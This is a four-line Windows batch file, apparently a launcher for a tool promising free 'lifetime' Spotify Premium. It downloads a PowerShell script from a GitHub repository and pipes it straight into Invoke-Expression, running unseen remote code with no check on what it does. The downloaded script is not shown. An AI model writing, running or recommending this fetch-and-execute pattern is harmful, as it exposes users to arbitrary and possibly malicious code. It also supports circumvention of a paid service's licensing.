@echo off
powershell -Command "& {Invoke-WebRequest -UseBasicParsing 'https://raw.githubusercontent.com/revinelol/Lifetime-Spotify-Premium/main/install.ps1' | Invoke-Expression}"
pause
exit
